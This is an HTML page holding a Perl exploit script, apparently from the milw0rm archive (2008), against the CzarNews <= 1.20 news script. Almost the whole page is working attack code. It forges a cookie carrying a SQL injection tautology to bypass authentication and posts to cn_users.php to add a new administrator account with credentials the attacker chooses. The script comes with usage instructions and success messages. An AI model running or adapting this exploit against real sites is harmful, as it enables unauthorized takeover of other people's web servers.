<html><head><title>CzarNews <= 1.20 (Cookie) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
# ----------------------------------------------------------
# CzarNews &lt;= v1.20 (Cookie) Remote SQL Injection Exploit
# Perl Exploit - Add a new admin with your credentials!
# Discovered On: 15/09/2008
# Discovered By: StAkeR - StAkeR[at]hotmail[dot]it
# ----------------------------------------------------------
# Usage: perl http://localhost/cms StAkeR obscure
# ----------------------------------------------------------

use strict;
use LWP::UserAgent;

my $email = 'some@example.net';
my ($hostname,$username,$password) = @ARGV;
my $request  = undef;
my $http_s   = new LWP::UserAgent or die $!;

$hostname = ($hostname =~ /^http:\/\/(.+?)$/) ? $ARGV[0] : banner();
banner() unless $username and $password;

$http_s-&gt;agent(&quot;Mozilla/4.5 [en] (Win95; U)&quot;);
$http_s-&gt;timeout(1);
$http_s-&gt;default_header('Cookie' =&gt; &quot;recook=' or '1=1,' or '1=1&quot;);           

$request = $http_s-&gt;post($hostname.&quot;/cn_users.php&quot;,
                         [
                          user    =&gt; $username,
                          pass    =&gt; $password,
                          email   =&gt; $email,
                          allcats =&gt; &quot;all&quot;,
                          admin   =&gt; &quot;off&quot;,
                          news    =&gt; &quot;on&quot;,
                          images  =&gt; &quot;on&quot;,
                          users   =&gt; &quot;on&quot;,
                          categories =&gt; &quot;on&quot;,
                          config  =&gt; &quot;on&quot;,
                          words  =&gt; &quot;on&quot;,
                          op =&gt; &quot;add&quot;,
                          id =&gt; '',
                          go  =&gt; &quot;true&quot;,
                          submit =&gt; &quot;Add+User&quot;
                        ]);
        
if($request-&gt;is_success)
{
  if($request-&gt;content =~ /has been added/i)
  {
    print &quot;[+] Added New Administrator: $username &amp; $password\n&quot;;
  }
  else
  {
    print &quot;[!] Exploit Failed!\n&quot;;
    print &quot;[!] Site Not Vulnerable\n&quot;;
  }
}


sub banner
{
  print &quot;[+] CzarNews &lt;= v1.20 Remote SQL Injection Exploit (add new admin)\n&quot;;
  print &quot;[+] Usage: perl exploit.pl [host] [username] [password]\n&quot;;
  return exit;
}

# milw0rm.com [2008-09-15]</pre></html>